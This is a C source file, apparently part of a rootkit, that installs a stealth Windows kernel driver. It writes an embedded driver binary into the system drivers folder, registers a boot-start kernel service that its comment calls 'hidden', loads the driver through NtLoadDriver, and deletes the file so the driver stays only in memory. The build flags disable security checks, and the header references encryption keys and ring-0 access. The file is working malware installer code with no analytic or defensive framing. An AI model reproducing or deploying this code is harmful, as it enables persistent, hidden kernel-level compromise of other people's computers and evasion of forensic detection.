// stealthinst.c  —  compiles with VS 2022, /GS- /RTC- /MT
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "stealth_poly.h"   // Camellia key/iv + RING0_ENABLE
#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (WINAPI *pNtLoadDriver)(PUNICODE_STRING);
typedef NTSTATUS (WINAPI *pNtUnloadDriver)(PUNICODE_STRING);

BOOL InstallDriver(VOID) {
    WCHAR drvPath[MAX_PATH];
    GetSystemDirectoryW(drvPath, MAX_PATH);
    wcscat_s(drvPath, MAX_PATH, L"\\drivers\\stealthdrv.sys");

    // write driver only during boot – delete immediately after
    HANDLE h = CreateFileW(drvPath, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written;
    WriteFile(h, g_DriverBin, sizeof(g_DriverBin), &written, NULL);
    CloseHandle(h);

    // create hidden service
    HKEY hkey;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\StealthDrv", 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL);
    DWORD start = 0;   // SERVICE_BOOT_START
    DWORD type = 1;    // SERVICE_KERNEL_DRIVER
    RegSetValueExW(hkey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(start));
    RegSetValueExW(hkey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(type));
    RegSetValueExW(hkey, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)drvPath, (wcslen(drvPath)+1)*2);
    RegCloseKey(hkey);

    // load driver
    UNICODE_STRING svc;
    RtlInitUnicodeString(&svc, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\StealthDrv");
    pNtLoadDriver NtLoadDriver = (pNtLoadDriver)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
    NtLoadDriver(&svc);

    // delete file again – driver is now in memory
    DeleteFileW(drvPath);
    return TRUE;
}
